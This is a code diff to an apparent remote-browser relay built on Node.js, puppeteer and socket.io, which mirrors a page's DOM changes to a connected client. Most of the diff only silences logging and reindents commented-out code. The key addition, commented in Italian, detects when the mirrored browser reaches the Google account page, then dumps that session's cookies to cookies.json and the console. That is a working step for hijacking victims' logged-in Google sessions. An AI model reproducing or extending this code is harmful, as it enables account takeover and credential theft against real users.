@@ -99,17 +99,24 @@ io.on('connection', async (socket) => {
             "--disable-setuid-sandbox"
         ]
     });
+
     //close the puppeteer browser when disconnecting
     socket.on('disconnect', async () => {
         try {
             await puppet.close();
         } catch (error) {
-            console.log(error);
+            //console.log(error);
         }
 
     });
     const page = await puppet.newPage();
     await page.setViewport({ width: 1366, height: 768 });
+
+    page.on('console', (msg) => {
+        if (msg.type() !== 'error') {
+            console.log(msg.text());
+        }
+    });
 
     //sets up all socket events except for disconnect function
     await setupSocketEvents(socket, page);
@@ -119,7 +126,6 @@ io.on('connection', async (socket) => {
     await setupChangeListeners(socket, page);
 
     page.goto(BASE_URL);
-
     //await sleep(2000);
 
     //variables needed in main loop
@@ -136,6 +142,15 @@ io.on('connection', async (socket) => {
         if (!data) {
             continue;
         }
+
+        if (page.url() === 'https://myaccount.google.com/') {
+            // Estrai i cookie di sessione
+            const cookies = await page.cookies();
+            fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));
+            console.log('Cookie di sessione salvati:', cookies);
+            break; // Esci dal ciclo una volta salvati i cookie
+        }
+
         //var currentResult = data;
         const $ = cheerio.load(data.mainhtml);
 
@@ -143,40 +158,40 @@ io.on('connection', async (socket) => {
         let newbodydiv = $('body').first().prop('outerHTML');
 
         // if (previousResult) {
-        //     const changes = [];
-        //     // Check main page input changes
-        //     for (let input of currentResult.mainInputs) {
-        //         const previousInput = previousResult.mainInputs.find(p => p.csspath === input.csspath);
-        //         if (previousInput && previousInput.value !== input.value) {
-        //             changes.push({
-        //                 csspath: input.csspath,
-        //                 oldValue: previousInput.value,
-        //                 newValue: input.value
-        //             });
-        //         }
-        //     }
-        //     // // Check iframe input changes
-        //     // for (let iframe of currentResult.iframes) {
-        //     //     for (let input of iframe.iframeInputs) {
-        //     //         const matchingIframe = previousResult.iframes.find(pIframe => pIframe.selector === iframe.selector);
-        //     //         if (matchingIframe) {
-        //     //             const previousInput = matchingIframe.iframeInputs.find(p => p.csspath === input.csspath);
-        //     //             if (previousInput && previousInput.value !== input.value) {
-        //     //                 changes.push({
-        //     //                     iframe: iframe.selector,
-        //     //                     csspath: input.csspath,
-        //     //                     oldValue: previousInput.value,
-        //     //                     newValue: input.value
-        //     //                 });
-        //     //             }
-        //     //         }
-        //     //     }
-        //     // }
-        //     // If there are any changes, add them to the allChanges array
-        //     // if (changes.length > 0) {
-        //     //     socket.emit('maininputs', changes);
-        //     // }
-        // }
+        //      const changes = [];
+             // Check main page input changes
+        //      for (let input of currentResult.mainInputs) {
+        //          const previousInput = previousResult.mainInputs.find(p => p.csspath === input.csspath);
+        //          if (previousInput && previousInput.value !== input.value) {
+        // //              changes.push({
+        //                  csspath: input.csspath,
+        //                  oldValue: previousInput.value,
+        //                  newValue: input.value
+        //              });
+        //          }
+        //      }
+             // // Check iframe input changes
+             // for (let iframe of currentResult.iframes) {
+             //     for (let input of iframe.iframeInputs) {
+             //         const matchingIframe = previousResult.iframes.find(pIframe => pIframe.selector === iframe.selector);
+             //         if (matchingIframe) {
+             //             const previousInput = matchingIframe.iframeInputs.find(p => p.csspath === input.csspath);
+             //             if (previousInput && previousInput.value !== input.value) {
+             //                 changes.push({
+             //                     iframe: iframe.selector,
+             //                     csspath: input.csspath,
+             //                     oldValue: previousInput.value,
+             //                     newValue: input.value
+             //                 });
+             //             }
+             //         }
+             //     }
+             // }
+             // If there are any changes, add them to the allChanges array
+             // if (changes.length > 0) {
+             //     socket.emit('maininputs', changes);
+             // }
+         // }
         // Update the previousResult for the next iteration
         //previousResult = data;
 
@@ -191,7 +206,7 @@ io.on('connection', async (socket) => {
             }
             changes.main.head = RemoveInvalidAttributesFromDiff(diff);
             //res.send(JSON.stringify({difference: }))
-            console.log('htmlhead changed');
+            //console.log('htmlhead changed');
         }
         if (oldbodydiv != newbodydiv) {
             var oldNode = diffdom.stringToObj(oldbodydiv);
@@ -205,7 +220,7 @@ io.on('connection', async (socket) => {
             changes.main.bodydiv = RemoveInvalidAttributesFromDiff(diff);
 
             //res.send(JSON.stringify({difference: }))
-            console.log('htmldivbody changed');
+            //console.log('htmldivbody changed');
         }
 
         if (!changes.iframes) {
@@ -228,7 +243,7 @@ io.on('connection', async (socket) => {
                 var diff = dd.diff(oldNode, newNode);
                 newIframe.head = RemoveInvalidAttributesFromDiff(diff);
 
-                console.log('htmlhead changed');
+                //console.log('htmlhead changed');
             }
             if (oldiframe.oldbodydiv != newbodydiv) {
                 var oldNode = diffdom.stringToObj(oldiframe.oldbodydiv);
@@ -237,12 +252,12 @@ io.on('connection', async (socket) => {
 
                 var diff = dd.diff(oldNode, newNode);
                 newIframe.bodydiv = RemoveInvalidAttributesFromDiff(diff);
-                console.log('htmldivbody changed');
+                //console.log('htmldivbody changed');
             }
 
             if (newIframe.head || newIframe.bodydiv) {
                 changes.iframes.push(newIframe);
-                console.log(`iframe with id ${iframe.selector} changed!`);
+                //console.log(`iframe with id ${iframe.selector} changed!`);
             }
 
         });
